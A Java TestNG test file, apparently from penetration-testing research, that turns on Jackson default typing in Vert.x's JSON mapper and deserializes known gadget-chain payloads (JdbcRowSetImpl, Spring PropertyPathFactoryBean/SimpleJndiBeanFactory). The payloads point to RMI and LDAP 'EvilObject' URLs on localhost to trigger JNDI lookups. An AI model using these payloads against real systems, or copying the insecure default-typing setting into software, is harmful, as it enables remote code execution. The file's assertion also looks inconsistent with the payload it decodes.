package de.marko.pentest.parser;

import io.vertx.core.json.Json;
import java.io.IOException;
import javax.naming.NamingException;
import org.testng.Assert;
import org.testng.annotations.Test;

/**
 * @author marko
 * @version 1.0.0.
 * @date 30.08.2017
 */
public class VertxJsonParserTest {

	@Test
	public void T001_parseVertxJsonVuln() throws IOException, NamingException {

		//System.setSecurityManager(new RMISecurityManager());

		// final String jdbcPayload = "{'id': 124,'object': ['com.sun.rowset.JdbcRowSetImpl',{'dataSourceName':'ldap://localhost:31337/obj','autoCommit':true}]}";

		final String jdbcPayload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"rmi://127.0.0.1:80/obj\",\"autoCommit\":true}]";

		final String payload = "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"rmi://localhost:1099/EvilObject\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"rmi://localhost:1099/EvilObject\"]}]}]";

		final String JSON = aposToQuotes(
			"{'id': 124,\n" +
				"'object': ['org.springframework.beans.factory.config.PropertyPathFactoryBean',\n" +
				"{\n" +
				"'targetBeanName': 'rmi://127.0.0.1:1111/EvilObject',\n" +
				"'propertyPath': 'foo',\n" +
				"'beanFactory': ['org.springframework.jndi.support.SimpleJndiBeanFactory',\n" +
				"{\n" +
				"'shareableResources': ['rmi://127.0.0.1:1111/EvilObject']\n" +
				"  }\n" +
				" ]\n" +
				"  }\n" +
				" ]\n" +
				"  }\n");

		Json.mapper.enableDefaultTyping();

		Object dummy = Json.decodeValue(jdbcPayload, Object.class);

		Assert.assertEquals(124, dummy);
	}

	protected static String aposToQuotes(String json) {
		return json.replace("'", "\"");
	}

}
